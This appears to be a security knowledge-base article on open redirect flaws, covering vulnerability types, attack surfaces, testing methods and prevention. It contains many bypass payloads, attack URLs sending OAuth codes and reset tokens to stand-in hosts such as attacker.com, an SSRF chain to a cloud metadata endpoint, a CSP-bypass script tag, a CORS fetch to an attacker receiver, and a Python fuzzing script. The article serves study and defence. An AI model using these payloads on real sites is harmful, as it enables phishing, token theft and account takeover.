---
title: Open Redirect
---

# Open Redirect

Open Redirect is a web security vulnerability that occurs when an application accepts user-controlled input to determine the destination of a redirect without proper validation. Attackers exploit this by crafting malicious URLs that appear to originate from a trusted domain but redirect victims to attacker-controlled sites. This vulnerability is commonly leveraged for phishing campaigns, credential theft, malware distribution, OAuth token theft, and bypassing security controls like SSRF protections and URL whitelists.

---

## Types of Open Redirect Vulnerabilities

### 1. Server-Side Redirects

- Application performs HTTP 3xx redirect based on user input
- Redirect happens at server level using HTTP headers (Location, Refresh)
- Common in login flows, logout handlers, and post-authentication redirects
- Attacker controls destination via URL parameters or POST data

**Example:**

```jsx
https://trusted-bank.com/login?redirect=https://attacker.com/phishing
# Server responds with
HTTP/1.1 302 Found
Location: https://attacker.com/phishing
```

### 2. Client-Side Redirects (JavaScript)

- Redirect executed in browser using JavaScript
- Uses `window.location`, `window.location.href`, `window.open()`, or `document.location`
- Harder to detect in automated scans
- Often found in SPAs and client-side routing frameworks

**Example:**

```jsx
// Vulnerable code
var redirect_url = new URLSearchParams(window.location.search).get('next');
window.location = redirect_url;

// Attack URL
https://app.example.com/dashboard?next=https://evil.com
```

### 3. Meta Refresh Redirects

- HTML meta tag triggers automatic redirect after specified time
- Often used for "page moved" notifications
- User-controlled content injected into meta refresh tag
- Can bypass some client-side protections

**Example:**

```jsx
<!-- Vulnerable page -->
<meta http-equiv="refresh" content="0;url=USER_INPUT">

<!-- Attack -->
https://site.com/page?url=https://attacker.com
Results in: <meta http-equiv="refresh" content="0;url=https://attacker.com">
```

### 4. Header Injection Leading to Redirect

- Application reflects user input in HTTP headers
- CRLF injection allows attacker to inject Location header
- Can chain with other vulnerabilities like XSS
- Bypasses standard redirect validation

**Example:**

```jsx
https://site.com/page?lang=en%0D%0ALocation:%20https://attacker.com

# Injected header
HTTP/1.1 200 OK
Content-Type: text/html
Location: https://attacker.com
```

### 5. OAuth/SAML Redirect Manipulation

- OAuth callback URLs accept attacker-controlled redirects
- `redirect_uri` parameter manipulation in OAuth flows
- SAML response manipulation to redirect after authentication
- Leads to authorization code/token theft

**Example:**

```jsx
# OAuth authorization request
https://oauth-provider.com/authorize?
  client_id=123
  &redirect_uri=https://attacker.com/steal
  &response_type=code

# Authorization code sent to attacker
https://attacker.com/steal?code=AUTHORIZATION_CODE
```

### 6. Domain Confusion Redirects

- Application validates domain but accepts variations
- Subdomain confusion, homograph attacks, or typosquatting
- Whitelisting bypasses using specially crafted domains
- Appears legitimate to users and automated tools

**Example:**

```jsx
# Whitelist check for "trusted.com"
https://app.com/redirect?url=https://trusted.com.attacker.com
https://app.com/redirect?url=https://trusted.com@attacker.com
https://app.com/redirect?url=https://trusted.com.evil.com
```

### 7. Path-Based Redirects

- Application only validates domain, ignores path
- Attacker uses open redirect on whitelisted domain
- Chains redirects through multiple trusted sites
- Bypasses strict domain validation

**Example:**

```jsx
# Site validates redirect domain is "partner.com"
https://app.com/redirect?url=https://partner.com/redirect?next=https://attacker.com

# User redirected: app.com → partner.com → attacker.com
```

---

## Attack Surfaces

### Login/Logout Flows

Applications commonly redirect users after authentication or logout.

**Vulnerable patterns:**

- `/login?next=/dashboard` accepts any URL
- `/logout?redirect=https://example.com` without validation
- Password reset flows with return URLs
- Multi-step authentication with continuation URLs

**Testing approach:**

```jsx
# Test login redirect
https://target.com/login?next=https://evil.com
https://target.com/login?redirect=//evil.com
https://target.com/login?continue=javascript:alert(1)

# Test logout redirect
https://target.com/logout?return_to=https://attacker.com
```

### OAuth/SSO Callback URLs

OAuth and SAML implementations accept redirect_uri parameters.

**Vulnerable patterns:**

- Insufficient `redirect_uri` validation
- Accepting any subdomain of registered domain
- Path traversal in redirect_uri
- Open redirects on whitelisted callback URLs

**Testing approach:**

```jsx
# Manipulate redirect_uri
https://oauth-provider.com/authorize?
  client_id=app123
  &redirect_uri=https://attacker.com
  &response_type=code

# Subdomain bypass
&redirect_uri=https://evil.trusted-domain.com

# Path traversal
&redirect_uri=https://trusted.com/../../evil.com
```

### Password Reset/Email Verification

Password reset emails often contain redirect parameters.

**Vulnerable patterns:**

- Reset token sent to attacker-controlled redirect
- Email verification returns to malicious URL
- Account recovery flows with open redirects
- Token leakage via Referer header

**Testing approach:**

```jsx
# Request password reset with malicious redirect
POST /password-reset
email=victim@email.com&redirect=https://attacker.com

# Victim clicks email link
https://target.com/reset?token=SECRET&next=https://attacker.com

# Token leaked in Referer header to attacker.com
```

### Language/Region Selectors

Multi-language sites often redirect based on locale preferences.

**Vulnerable patterns:**

- Language parameter accepts full URLs
- Locale switcher without validation
- Region selector redirects to arbitrary domains
- Currency/timezone change handlers

**Testing approach:**

```jsx
https://site.com/set-language?lang=en&return=https://evil.com
https://site.com/region?locale=us&redirect=//attacker.com
```

### Download/File Handlers

File download endpoints that redirect to CDN or storage URLs.

**Vulnerable patterns:**

- Download parameter accepts external URLs
- File proxy endpoints without validation
- PDF/document viewer redirect parameters
- Media player source URL manipulation

**Testing approach:**

```jsx
https://site.com/download?file=https://evil.com/malware.exe
https://site.com/view-pdf?url=https://attacker.com/phishing.pdf
```

### Search and Filter Results

Search result pages with redirect-on-click functionality.

**Vulnerable patterns:**

- Click tracking with unvalidated URLs
- Search result redirects for external links
- Affiliate link handlers
- Ad click tracking endpoints

**Testing approach:**

```jsx
https://site.com/track-click?url=https://evil.com
https://site.com/go?link=https://attacker.com/phishing
```

---

## Exploitation Techniques

### Basic Open Redirect Exploitation

**Standard URL Parameter:**

```jsx
https://trusted-site.com/redirect?url=https://attacker.com
https://trusted-site.com/login?next=https://evil.com
https://trusted-site.com/go?to=https://phishing-site.com
```

**Protocol-Relative URLs:**

```jsx
https://trusted-site.com/redirect?url=//attacker.com
https://trusted-site.com/login?next=//evil.com

# Browser interprets as https://attacker.com
```

**Path-Relative Bypasses:**

```jsx
https://trusted-site.com/redirect?url=/redirect?url=https://evil.com
https://trusted-site.com/login?next=/../../evil.com
```

### Whitelist Bypass Techniques

**Subdomain Manipulation:**

```jsx
# If whitelist checks for "trusted.com"
https://app.com/redirect?url=https://trusted.com.attacker.com
https://app.com/redirect?url=https://attacker.com.trusted.com (if attacker owns domain)
https://app.com/redirect?url=https://trusted.com@attacker.com
```

**URL Parser Confusion:**

```jsx
# Different parsers interpret URLs differently
https://app.com/redirect?url=https://trusted.com:@attacker.com
https://app.com/redirect?url=https://trusted.com%2F@attacker.com
https://app.com/redirect?url=https://trusted.com%09@attacker.com
```

**Path Traversal:**

```jsx
https://app.com/redirect?url=https://trusted.com/../../evil.com
https://app.com/redirect?url=https://trusted.com/../../../../../evil.com
```

**Null Byte Injection:**

```jsx
https://app.com/redirect?url=https://trusted.com%00.attacker.com
https://app.com/redirect?url=https://trusted.com%00@attacker.com
```

**Backslash vs Forward Slash:**

```jsx
https://app.com/redirect?url=https://trusted.com\@attacker.com
https://app.com/redirect?url=https://trusted.com\.attacker.com
```

**Unicode/IDN Homograph:**

```jsx
# Using lookalike Unicode characters
https://app.com/redirect?url=https://trusted.com (actual: trusted.com with Cyrillic 'o')
```

### Encoding Bypasses

**URL Encoding:**

```jsx
https://app.com/redirect?url=https%3A%2F%2Fattacker.com
https://app.com/redirect?url=https%3a%2f%2fattacker.com
```

**Double URL Encoding:**

```jsx
https://app.com/redirect?url=https%253A%252F%252Fattacker.com
```

**Mixed Encoding:**

```jsx
https://app.com/redirect?url=https%3A//attacker.com
https://app.com/redirect?url=https:%2F%2Fattacker.com
```

**Hex Encoding:**

```jsx
https://app.com/redirect?url=\x68\x74\x74\x70\x73://attacker.com
```

### JavaScript Protocol Bypasses

**Basic JavaScript Protocol:**

```jsx
https://app.com/redirect?url=javascript:alert(document.domain)
https://app.com/redirect?url=javascript:window.location='https://attacker.com'
```

**Encoded JavaScript:**

```jsx
https://app.com/redirect?url=java%09script:alert(1)
https://app.com/redirect?url=java%0ascript:alert(1)
https://app.com/redirect?url=javascript%3Aalert(1)
```

**Case Manipulation:**

```jsx
https://app.com/redirect?url=jAvAsCrIpT:alert(1)
https://app.com/redirect?url=JaVaScRiPt:alert(1)
```

### CRLF Injection for Redirect

**Header Injection:**

```jsx
https://app.com/page?lang=en%0D%0ALocation:%20https://attacker.com

# Results in injected header:
Location: https://attacker.com
```

**Double CRLF:**

```jsx
https://app.com/page?param=value%0D%0A%0D%0ALocation:%20https://evil.com
```

### OAuth Token Theft via Open Redirect

**Attack Flow:**

```jsx
1. Victim initiates OAuth login
2. Attacker manipulates redirect_uri parameter
3. Authorization code sent to attacker-controlled URL
4. Attacker exchanges code for access token
5. Full account takeover

# Malicious OAuth request
https://oauth-provider.com/authorize?
  client_id=legitimate-app
  &redirect_uri=https://attacker.com/callback
  &response_type=code
  &scope=full_access
```

### Chaining with SSRF

**Using Open Redirect to Bypass SSRF Protections:**

```jsx
# SSRF protection blocks internal IPs
# But allows requests to trusted.com

# Attacker finds open redirect on trusted.com
https://trusted.com/redirect?url=http://127.0.0.1:8080/admin

# SSRF payload
POST /fetch-url
url=https://trusted.com/redirect?url=http://localhost/admin

# Request appears to go to trusted.com
# But actually redirects to internal admin panel
```

---

## Advanced Attack Scenarios

### 1. OAuth Authorization Code Theft via Open Redirect

**Scenario:**

OAuth provider insufficiently validates redirect_uri, allowing attacker to receive victim's authorization code.

**Attack Flow:**

```jsx
1. Attacker crafts malicious OAuth URL:
   https://oauth-provider.com/authorize?
     client_id=legit-app
     &redirect_uri=https://attacker.com/steal
     &response_type=code
     &state=random

2. Victim clicks link and authorizes application

3. OAuth provider redirects to attacker's URL:
   https://attacker.com/steal?code=VICTIM_AUTH_CODE

4. Attacker exchanges code for access token

5. Full account takeover on victim's account
```

---

### 2. Password Reset Token Theft

**Scenario:**

Password reset flow includes redirect parameter that leaks reset token to attacker via Referer header.

**Attack Flow:**

```jsx
1. Attacker requests password reset for victim's account:
   POST /password-reset
   email=victim@email.com&redirect=https://attacker.com

2. Victim receives email with reset link:
   https://target.com/reset?token=SECRET_TOKEN&next=https://attacker.com

3. Victim clicks link and is redirected

4. Browser sends Referer header to attacker.com:
   Referer: https://target.com/reset?token=SECRET_TOKEN

5. Attacker extracts token from logs

6. Attacker resets victim's password
```

---

### 3. Phishing Campaign Using Trusted Domain

**Scenario:**

Attacker leverages open redirect on legitimate site to create convincing phishing URLs.

**Attack Flow:**

```jsx
1. Attacker discovers open redirect:
   https://trusted-bank.com/redirect?url=ATTACKER_URL

2. Attacker creates phishing page mimicking bank login

3. Attacker sends phishing email:
   "Your account has been compromised. Reset password here:
    https://trusted-bank.com/redirect?url=https://evil-bank-clone.com"

4. Victim sees trusted-bank.com in URL and clicks

5. Redirected to attacker's phishing page

6. Victim enters credentials thinking it's legitimate

7. Attacker steals credentials
```

---

### 4. XSS via JavaScript Protocol Redirect

**Scenario:**

Open redirect accepts `javascript:` protocol, leading to XSS execution.

**Attack Flow:**

```jsx
1. Attacker finds redirect parameter

2. Injects JavaScript protocol:
   https://site.com/redirect?url=javascript:alert(document.cookie)

3. Application sets window.location to user input

4. Browser executes JavaScript instead of redirecting

5. Full XSS execution in victim's browser
```

---

### 5. SSRF Bypass via Chained Open Redirect

**Scenario:**

Application blocks requests to internal IPs but allows requests to whitelisted domains with open redirects.

**Attack Flow:**

```jsx
1. Application allows fetching from trusted-partner.com

2. Attacker finds open redirect on trusted-partner.com:
   https://trusted-partner.com/go?url=REDIRECT_TARGET

3. Attacker chains redirect to internal service:
   POST /fetch-content
   url=https://trusted-partner.com/go?url=http://169.254.169.254/latest/meta-data/

4. Application fetches from trusted-partner.com (allowed)

5. Open redirect forwards request to AWS metadata service

6. Internal data returned to attacker
```

---

### 6. Session Fixation via Open Redirect

**Scenario:**

Open redirect on login page allows attacker to set session before victim authenticates.

**Attack Flow:**

```jsx
1. Attacker obtains session ID from application:
   Visit: https://site.com
   Get session: SESSIONID=attacker_session_123

2. Craft malicious login URL with fixed session:
   https://site.com/login?SESSIONID=attacker_session_123&redirect=https://attacker.com

3. Victim clicks link and authenticates

4. Application doesn't regenerate session after login

5. Attacker uses attacker_session_123 to access victim's account
```

---

### 7. CORS Bypass via Open Redirect

**Scenario:**

Application has strict CORS policy but trusts specific domains with open redirects.

**Attack Flow:**

```jsx
1. Application allows CORS requests from trusted.com

2. Attacker finds open redirect on trusted.com

3. Attacker creates malicious page:
   fetch('https://trusted.com/redirect?url=https://attacker.com/cors-receiver', {
     credentials: 'include'
   })

4. Request appears to come from trusted.com (CORS allowed)

5. Response redirects to attacker's domain

6. Sensitive data leaked cross-origin
```

---

### 8. CSP Bypass Using Whitelisted Open Redirect

**Scenario:**

Content Security Policy whitelists specific domain that contains open redirect.

**Attack Flow:**

```jsx
1. CSP policy: script-src 'self' trusted-cdn.com

2. Attacker finds open redirect on trusted-cdn.com

3. Inject payload:
   <script src="https://trusted-cdn.com/redirect?url=https://attacker.com/malicious.js"></script>

4. Browser allows script load (trusted-cdn.com is whitelisted)

5. Open redirect serves attacker's JavaScript

6. Malicious script executes despite CSP
```

---

### 9. Rate Limit Bypass via Domain Rotation

**Scenario:**

Application rate limits based on destination domain but has open redirect.

**Attack Flow:**

```jsx
1. Application limits requests to same external domain

2. Attacker uses open redirect to appear as different domains:
   https://site.com/redirect?url=https://target1.com
   https://site.com/redirect?url=https://target2.com
   https://site.com/redirect?url=https://target3.com

3. All requests appear to go through site.com

4. Rate limiting bypassed as destination varies

5. Attacker performs mass scanning/enumeration
```

---

## Detection Techniques

### Manual Testing Methodology

**1. Parameter Identification:**

```jsx
# Look for redirect-related parameters
url, redirect, next, return, goto, target, destination, 
redir, redirect_uri, continue, returnUrl, return_to, 
callback, out, forward, link, go

# Test each parameter
https://target.com/page?next=https://evil.com
https://target.com/login?redirect=//attacker.com
```

**2. Response Analysis:**

```jsx
# Check HTTP response for redirects
curl -I "https://target.com/redirect?url=https://evil.com"

# Look for:
# - HTTP 301/302/303/307/308 status codes
# - Location header pointing to user input
# - Meta refresh tags
# - JavaScript redirects in response
```

**3. Browser Behavior Testing:**

```jsx
# Open URL in browser with dev tools
# Monitor:
# - Network tab for redirect chain
# - Console for JavaScript redirects
# - Final destination URL
# - Any validation error messages
```

**4. Validation Bypass Testing:**

```jsx
# Test various bypass techniques systematically
https://site.com/redirect?url=https://trusted.com@attacker.com
https://site.com/redirect?url=https://trusted.com.attacker.com
https://site.com/redirect?url=//attacker.com
https://site.com/redirect?url=///attacker.com
https://site.com/redirect?url=////attacker.com
https://site.com/redirect?url=/\/\/attacker.com
https://site.com/redirect?url=%2F%2Fattacker.com
```

**5. OAuth Flow Testing:**

```jsx
# Manipulate OAuth redirect_uri
https://oauth-provider.com/authorize?
  client_id=123
  &redirect_uri=https://attacker.com
  &response_type=code

# Check if authorization code sent to malicious URL
```

### Automated Testing Tools

**1. Custom Python Script:**

```jsx
import requests

payloads = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\/\/evil.com",
    "https://trusted.com@evil.com",
    "javascript:alert(1)",
    "https:%2F%2Fevil.com"
]

def test_open_redirect(url, param):
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        r = requests.get(test_url, allow_redirects=False)
        
        if r.status_code in [301, 302, 303, 307, 308]:
            location = r.headers.get('Location', '')
            if 'evil.com' in location:
                print(f"[!] Open Redirect Found: {test_url}")
                print(f"    Location: {location}")

# Usage
test_open_redirect("https://target.com/redirect", "url")
```

**2. Burp Suite Intruder:**

```jsx
1. Capture redirect request in Burp
2. Send to Intruder
3. Mark redirect parameter as insertion point
4. Load open redirect payload list
5. Start attack
6. Filter responses with 3xx status codes
7. Check Location header for attacker domain
```

**3. FFUF for Parameter Discovery:**

```jsx
# Find redirect parameters
ffuf -u "https://target.com/FUZZ?url=https://evil.com" \
     -w /path/to/wordlist.txt \
     -mc 301,302,303,307,308 \
     -t 50

# Test discovered parameters
ffuf -u "https://target.com/redirect?FUZZ=https://evil.com" \
     -w redirect-params.txt \
     -mc 301,302,303,307,308
```

### Pattern Recognition

**Common Vulnerable Patterns in Code:**

```jsx
// Vulnerable: Direct use of user input
window.location = params.get('redirect');

// Vulnerable: Insufficient validation
if (redirect.startsWith('/')) {
    window.location = redirect;
}
// Bypass: //evil.com starts with /

// Vulnerable: Regex bypass
if (/^https:\/\/trusted\.com/.test(redirect)) {
    window.location = redirect;
}
// Bypass: https://trusted.com@evil.com
```

**Server-Side Vulnerable Patterns:**

```jsx
# Vulnerable: No validation
@app.route('/redirect')
def redirect_handler():
    url = request.args.get('url')
    return redirect(url)

# Vulnerable: Weak validation
@app.route('/redirect')
def redirect_handler():
    url = request.args.get('url')
    if 'trusted.com' in url:
        return redirect(url)
# Bypass: evil.com/trusted.com
```

---

## Impact

- **Phishing:** Open redirects enable trusted-domain phishing, leading to credential theft and account compromise.
- **OAuth Account Takeover:** Unvalidated `redirect_uri` parameters can expose authorization codes, resulting in full account takeover.
- **Password Reset Hijacking:** Redirect-based token leakage can allow attackers to reset victim passwords and gain unauthorized access.
- **XSS Escalation:** Open redirects supporting `javascript:` URLs can escalate into XSS, enabling session theft and user impersonation.
- **SSRF / Cloud Credential Exposure:** Redirect chaining can bypass network restrictions and expose sensitive cloud metadata or credentials.
- **CSP Bypass:** Open redirects on trusted domains can be abused to bypass CSP protections and execute malicious scripts.
- **Session Fixation:** Attackers can force victims to authenticate with attacker-controlled sessions, leading to unauthorized account access.
- **Phishing Filter Evasion:** Trusted-domain redirects increase phishing credibility and help bypass email security controls.
- **CORS Bypass & Data Theft:** Open redirects on trusted origins can facilitate cross-origin data exfiltration and sensitive information disclosure.

---

## Prevention

- **Allowlist Redirects:** Only permit redirects to explicitly approved destinations and block all untrusted URLs.
- **Use Indirect References:** Replace user-supplied URLs with server-side mapped destination IDs.
- **Eliminate User-Controlled Redirects:** Determine redirect targets using application logic rather than user input.
- **Enforce Strict Domain Validation:** Allow only exact HTTPS domain matches and reject IPs, localhost, and partial matches.
- **Remove Redirect Parameters from Sensitive Flows:** Prevent user-controlled redirects in password reset, OAuth, and logout functionality.
- **Secure URL Parsing:** Use trusted URL parsing libraries and validate protocol, host, path, and query components separately.
- **External Redirect Warning Page:** Display a confirmation page before redirecting users to third-party websites.
- **Regenerate Sessions After Login:** Issue a new session identifier upon authentication to prevent session fixation.
- **Harden Session Cookies:** Use `SameSite=Strict` to reduce abuse of cross-site redirects and CSRF attacks.
- **Strict OAuth `redirect_uri` Validation:** Require exact matches against registered callback URLs and reject wildcards.
- **Rate Limit Redirect Endpoints:** Restrict excessive redirect requests to reduce phishing and automated abuse.
- **Restrict Allowed Protocols:** Permit only `http://` and `https://` schemes while blocking `javascript:`, `data:`, and other dangerous protocols.
- **Validate Destinations Before Sending Sensitive Data:** Ensure tokens, assertions, and credentials are only sent to trusted and pre-approved endpoints.

---

## Tools

| **Tool** | **Purpose** |
| --- | --- |
| [Open-Redirect-Payloads](https://github.com/yogsec/Open-Redirect-Payloads) | Collection of open redirect bypass payloads |
| [OpenRedireX](https://github.com/devanshbatham/OpenRedireX) | Automated open redirect fuzzer |
| [Waybackurls](https://github.com/tomnomnom/waybackurls) | Find historical redirect parameters from archives |
| [Nuclei](https://github.com/projectdiscovery/nuclei) | Automated templates for open redirect detection |

---

## Good to Read

- [HackerOne - Top 25 Open Redirect Reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPREDIRECT.md)
- [Intigriti - Open Redirect to Account Takeover](https://blog.intigriti.com/2021/06/16/hacker-tools-open-redirect-to-account-takeover/)
- [Bug Bounty Reports - Session Theft via Open Redirect](https://medium.com/@rishuraj/redirect-gone-wrong-how-i-chained-open-redirect-to-steal-sessions)
- [HackerOne Report #2731](https://hackerone.com/reports/2731) - Slack Open Redirect

---

## References

- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)
- [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [https://cwe.mitre.org/data/definitions/601.html](https://cwe.mitre.org/data/definitions/601.html)
- [https://owasp.org/www-community/attacks/Open_redirect](https://owasp.org/www-community/attacks/Open_redirect)
- [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [https://learn.snyk.io/lesson/open-redirect/](https://learn.snyk.io/lesson/open-redirect/)
- [https://book.hacktricks.xyz/pentesting-web/open-redirect](https://book.hacktricks.xyz/pentesting-web/open-redirect)
- [https://github.com/yogsec/Open-Redirect-Payloads](https://github.com/yogsec/Open-Redirect-Payloads)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [https://hackerone.com/reports/1865991](https://hackerone.com/reports/1865991)
- [https://github.com/chmodx1sh/Security-Hub/blob/main/Open-Redirec-Hub/top-open-redirect-reports.md](https://github.com/chmodx1sh/Security-Hub/blob/main/Open-Redirec-Hub/top-open-redirect-reports.md)